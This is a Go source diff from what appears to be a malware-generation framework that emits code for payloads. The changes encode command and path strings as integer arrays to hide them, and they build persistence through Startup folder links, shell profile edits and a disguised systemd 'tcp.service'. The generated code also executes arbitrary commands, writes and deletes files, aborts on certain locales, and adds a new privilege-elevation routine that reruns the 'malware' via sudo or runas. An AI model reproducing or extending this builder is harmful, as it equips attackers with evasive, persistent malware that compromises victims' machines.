@@ -52,11 +52,7 @@ func Out(s_json string, msg string) ([]string, string) {
 	data_object.Add_go_import("fmt")
 
 	// Construct our int array
-	parameter := "[]int{"
-	for _, repr := range tools.Generate_int_array(msg) {
-		parameter += fmt.Sprintf("%d,", repr)
-	}
-	parameter += "}"
+	parameter := tools.Generate_int_array_parameter(msg)
 
 	return []string{fmt.Sprintf("%s(%s)", function_call, parameter)}, structure.Send(data_object)
 }
@@ -80,11 +76,7 @@ func Outln(s_json string, msg string) ([]string, string) {
 	data_object.Add_go_import("fmt")
 
 	// Construct our int array
-	parameter := "[]int{"
-	for _, repr := range tools.Generate_int_array(msg) {
-		parameter += fmt.Sprintf("%d,", repr)
-	}
-	parameter += "}"
+	parameter := tools.Generate_int_array_parameter(msg)
 
 	return []string{fmt.Sprintf("%s(%s)", function_call, parameter)}, structure.Send(data_object)
 }
@@ -99,7 +91,8 @@ func Exec(s_json string, cmd string) ([]string, string) {
 	function_call := "Exec"
 
 	data_object.Add_go_function([]string{
-		fmt.Sprintf("func %s(cmd string){", function_call),
+		fmt.Sprintf("func %s(repr []int){", function_call),
+		"cmd := spine.alpha.construct_string(repr)",
 		"cmd = spine.variable.get(cmd)",
 		"split_cmd := strings.Split(cmd, \" \")",
 		"cmd = strings.ReplaceAll(split_cmd[0], \"\\\"\", \"\")",
@@ -115,7 +108,10 @@ func Exec(s_json string, cmd string) ([]string, string) {
 	data_object.Add_go_import("fmt")
 	data_object.Add_go_import("strings")
 
-	return []string{fmt.Sprintf("%s(%s)", function_call, cmd)}, structure.Send(data_object)
+	// Construct our int array
+	parameter := tools.Generate_int_array_parameter(cmd)
+
+	return []string{fmt.Sprintf("%s(%s)", function_call, parameter)}, structure.Send(data_object)
 }
 
 //
@@ -137,15 +133,17 @@ func Abort(s_json string, languages string) ([]string, string) {
 		fmt.Sprintf("func %s(languages []string){", function_call),
 		"computer_lang, err := jibber_jabber.DetectTerritory()",
 		"if err != nil {",
-		"fmt.Println(err.Error())",
-		"}else{",
+		"notify.Log(err.Error(), spine.logging, \"3\")",
+		"return",
+		"}",
 		"for _, lang := range languages{",
 		"if lang == computer_lang{",
 		"os.Exit(0)",
-		"}}}}"})
+		"}}}"})
 
 	data_object.Add_go_import("os")
 	data_object.Add_go_import("github.com/cloudfoundry/jibber_jabber")
+	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")
 
 	return []string{fmt.Sprintf("%s(%s)", function_call, language_array)}, structure.Send(data_object)
 }
@@ -212,30 +210,34 @@ func Shutdown(s_json string) ([]string, string) {
 //
 func Add_to_startup(s_json string) ([]string, string) {
 	data_object := structure.Receive(s_json)
-	function_call := "Add_2_startup"
+	function_call := "Add_startup"
+
+	body := []string{fmt.Sprintf("func %s(){", function_call)}
 
 	if data_object.Target_os == "windows" {
-		data_object.Add_go_function([]string{
-			fmt.Sprintf("func %s(){", function_call),
-			"malware_path, _ := os.Executable()",
+		body = append(body, "malware_path, _ := spine.path",
 			"os.Link(malware_path, \"%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\")",
-			"os.Link(malware_path, \"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\")",
-			"}"})
+			"os.Link(malware_path, \"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\")")
 
 	} else {
-		data_object.Add_go_function([]string{
-			fmt.Sprintf("func %s(){", function_call),
+		body = append(body,
 			"malware_path, _ := os.Executable()",
 
 			"for _, line := range []string{\"/etc/profile\", \"~/.bash_profile\", \"~/.bash_login\", \"~/.profile\", \"/etc/rc.local\"} {",
 			"in, err := os.OpenFile(line, os.O_APPEND|os.O_WRONLY, 0644)",
-			"if err == nil {",
-			"in.WriteString(\"sudo .\" + malware_path + \" &\")",
+			"if err != nil {",
+			"notify.Log(err.Error(), spine.logging, \"3\")",
+			"return",
 			"}",
+			"in.WriteString(\"sudo .\" + malware_path + \" &\")",
 			"}",
 
 			"in, err := os.Create(\"/lib/systemd/system/tcp.service\")",
-			"if err == nil {",
+			"if err != nil {",
+			"notify.Log(err.Error(), spine.logging, \"3\")",
+			"return",
+			"}",
+
 			"write := bufio.NewWriter(in)",
 			"what_to_write := []string{",
 			"\"[Unit]\",",
@@ -244,23 +246,25 @@ func Add_to_startup(s_json string) ([]string, string) {
 
 			"\"[Service]\",",
 			"\"Type=idle\",",
-			"\"ExecStart=.malware_path\",",
+			"fmt.Sprintf(\"ExecStart=%s\", spine.path),",
 
 			"\"[Install]\",",
 			"\"WantedBy=multi-user.target\",",
-
 			"}",
-
 			"for _, line := range what_to_write {",
 			"write.WriteString(line)",
 			"}",
 			"exec.Command(\"sudo\", \"systemctl\", \"enable\", \"tcp.service\").Run()",
-			"exec.Command(\"sudo\", \"systemctl\", \"start\", \"tcp.service\").Run()",
-			"}}"})
+			"exec.Command(\"sudo\", \"systemctl\", \"start\", \"tcp.service\").Run()")
+
+		data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")
 	}
+
+	body = append(body, "}")
+	data_object.Add_go_function(body)
+
 	data_object.Add_go_import("os/exec")
 	data_object.Add_go_import("bufio")
-
 	data_object.Add_go_import("os")
 
 	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
@@ -286,12 +290,19 @@ func write(s_json string, value string) ([]string, string) {
 	}
 
 	data_object.Add_go_function([]string{
-		fmt.Sprintf("func %s(path string, content string){", function_call),
+		fmt.Sprintf("func %s(repr_1  []int, repr_2 []int){", function_call),
+		"path := spine.alpha.construct_string(repr_1)",
 		"path = spine.variable.get(path)",
+
+		"content := spine.alpha.construct_string(repr_2)",
 		"content = spine.variable.get(content)",
 
-		"file, result := os.Create(path)",
-		"if result == nil{",
+		"file, err := os.Create(path)",
+		"if err != nil{",
+		"notify.Log(err.Error(), spine.logging, \"3\")",
+		"return",
+		"}",
+
 		"defer file.Close()",
 		"result := tools.Starts_with(content, []string{\"[HEX];\"})",
 		"if ok := result[\"[HEX];\"]; !ok {",
@@ -301,15 +312,19 @@ func write(s_json string, value string) ([]string, string) {
 		"for _, data := range split {",
 		"data, _ := hex.DecodeString(data)",
 		"file.Write(data)",
-		"}}}}",
+		"}}}",
 	})
 
 	data_object.Add_go_import("encoding/hex")
 	data_object.Add_go_import("os")
 	data_object.Add_go_import("strings")
 	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")
+	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")
 
-	return []string{fmt.Sprintf("%s(\"%s\", %s)", function_call, path, data)}, structure.Send(data_object)
+	parameter_path := tools.Generate_int_array_parameter(path)
+	parameter_data := tools.Generate_int_array_parameter(data)
+
+	return []string{fmt.Sprintf("%s(%s, %s)", function_call, parameter_path, parameter_data)}, structure.Send(data_object)
 }
 
 //
@@ -323,7 +338,8 @@ func read(s_json string, value string) ([]string, string) {
 	value = tools.Erase_delimiter(value, []string{"\""}, -1)
 
 	data_object.Add_go_function([]string{
-		fmt.Sprintf("func %s(path string){", function_call),
+		fmt.Sprintf("func %s(repr []int){", function_call),
+		"path := spine.alpha.construct_string(repr)",
 		"path = spine.variable.get(path)",
 		"gut, err := ioutil.ReadFile(path)",
 		"if err != nil{",
@@ -334,7 +350,10 @@ func read(s_json string, value string) ([]string, string) {
 
 	data_object.Add_go_import("io/ioutil")
 
-	return []string{fmt.Sprintf("%s(\"%s\")", function_call, value)}, structure.Send(data_object)
+	// Construct our int array
+	parameter := tools.Generate_int_array_parameter(value)
+
+	return []string{fmt.Sprintf("%s(%s)", function_call, parameter)}, structure.Send(data_object)
 
 }
 
@@ -404,18 +423,23 @@ func remove(value string, s_json string) ([]string, string) {
 	data_object := structure.Receive(s_json)
 	function_call := "remove"
 	data_object.Add_go_function([]string{
-		fmt.Sprintf("func %s(target string){", function_call),
+		fmt.Sprintf("func %s(repr []int){", function_call),
+		"target := spine.alpha.construct_string(repr)",
 		"target = spine.variable.get(target)",
 		"err := os.Remove(target)",
 		"if err != nil{",
 		"notify.Log(err.Error(), spine.logging, \"3\")",
+		"return",
 		"}",
 		"}"})
 
 	data_object.Add_go_import("os")
 	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")
 
-	return []string{fmt.Sprintf("%s(%s)", function_call, value)}, structure.Send(data_object)
+	// Construct our int array
+	parameter := tools.Generate_int_array_parameter(value)
+
+	return []string{fmt.Sprintf("%s(%s)", function_call, parameter)}, structure.Send(data_object)
 
 }
 
@@ -438,21 +462,31 @@ func move(value string, s_json string) ([]string, string) {
 	new_path := arr.Get(1)
 
 	data_object.Add_go_function([]string{
-		fmt.Sprintf("func %s(old_path string, new_path string){", function_call),
+		fmt.Sprintf("func %s(old_repr []int, new_repr []int){", function_call),
+		"old_path := spine.alpha.construct_string(old_repr)",
 		"old_path = spine.variable.get(old_path)",
+
+		"new_path := spine.alpha.construct_string(new_repr)",
 		"new_path = spine.variable.get(new_path)",
 
 		"err := os.Rename(old_path, new_path)",
 
 		"if err != nil{",
 		"notify.Log(err.Error(), spine.logging, \"3\")",
+		"return",
 		"}",
 		"}"})
 
 	data_object.Add_go_import("os")
 	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")
 
-	return []string{fmt.Sprintf("%s(\"%s\", \"%s\")", function_call, old_path, new_path)}, structure.Send(data_object)
+	// Construct our int array
+	old_parameter := tools.Generate_int_array_parameter(old_path)
+
+	// Construct our int array
+	new_parameter := tools.Generate_int_array_parameter(new_path)
+
+	return []string{fmt.Sprintf("%s(%s, %s)", function_call, old_parameter, new_parameter)}, structure.Send(data_object)
 
 }
 
@@ -475,18 +509,23 @@ func copy(value string, s_json string) ([]string, string) {
 	new_path := arr.Get(1)
 
 	data_object.Add_go_function([]string{
-		fmt.Sprintf("func %s(old_path string, new_path string){", function_call),
+		fmt.Sprintf("func %s(old_repr []int, new_repr []int){", function_call),
+		"old_path := spine.alpha.construct_string(old_repr)",
 		"old_path = spine.variable.get(old_path)",
+
+		"new_path := spine.alpha.construct_string(new_repr)",
 		"new_path = spine.variable.get(new_path)",
 
 		"src, err := os.Open(old_path)",
 		"if err != nil{",
 		"notify.Log(err.Error(), spine.logging, \"3\")",
+		"return",
 		"}",
 
 		"dst, err := os.Create(new_path)",
 		"if err != nil{",
 		"notify.Log(err.Error(), spine.logging, \"3\")",
+		"return",
 		"}",
 
 		"_, err = io.Copy(dst, src)",
@@ -500,20 +539,23 @@ func copy(value string, s_json string) ([]string, string) {
 	data_object.Add_go_import("os")
 	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")
 
-	return []string{fmt.Sprintf("%s(\"%s\", \"%s\")", function_call, old_path, new_path)}, structure.Send(data_object)
+	// Construct our int array
+	old_parameter := tools.Generate_int_array_parameter(old_path)
+	new_parameter := tools.Generate_int_array_parameter(new_path)
 
+	return []string{fmt.Sprintf("%s(%s, %s)", function_call, old_parameter, new_parameter)}, structure.Send(data_object)
 }
 
 //
 //
-//
+// Changes the background to what you want it to be
 //
 //
 func change_background(value string, s_json string) ([]string, string) {
 	data_object := structure.Receive(s_json)
 	function_call := "change_background"
 
-	body := []string{fmt.Sprintf("func %s(image_path string){", function_call), "image_path = spine.variable.get(image_path)"}
+	body := []string{fmt.Sprintf("func %s(repr_path []int){", function_call), "image_path := spine.alpha.construct_string(repr_path)", "image_path = spine.variable.get(image_path)"}
 
 	switch data_object.Target_os {
 	case "windows":
@@ -546,5 +588,39 @@ func change_background(value string, s_json string) ([]string, string) {
 	data_object.Add_go_import("os/exec")
 	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")
 
-	return []string{fmt.Sprintf("%s(%s)", function_call, value)}, structure.Send(data_object)
+	// Construct our int array
+	parameter := tools.Generate_int_array_parameter(value)
+
+	return []string{fmt.Sprintf("%s(%s)", function_call, parameter)}, structure.Send(data_object)
+}
+
+//
+//
+// Tries to do a so-called "regular" elevation of the malwares priviliges
+//
+//
+func elevate(value string, s_json string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "elevate"
+	body := []string{fmt.Sprintf("func %s(){", function_call), "if spine.is_admin{", "notify.Log(\"Malware is already elevated\", spine.logging, \"3\")", "return", "}"}
+
+	if data_object.Target_os == "windows" {
+		body = append(body, "out, err := exec.Command(\"runas\", \"/user:administrator\", spine.path).Output()")
+
+	} else {
+		body = append(body, "out, err := exec.Command(\"sudo\", spine.path).Output()")
+	}
+
+	body = append(body, "if err != nil{", "notify.Log(err.Error(), spine.logging, \"3\")", "return", "}", "spine.variable.set(string(out))")
+
+	body = append(body, "}")
+
+	data_object.Add_go_function(body)
+
+	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")
+	data_object.Add_go_import("os")
+	data_object.Add_go_import("os/exec")
+
+	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
+
 }
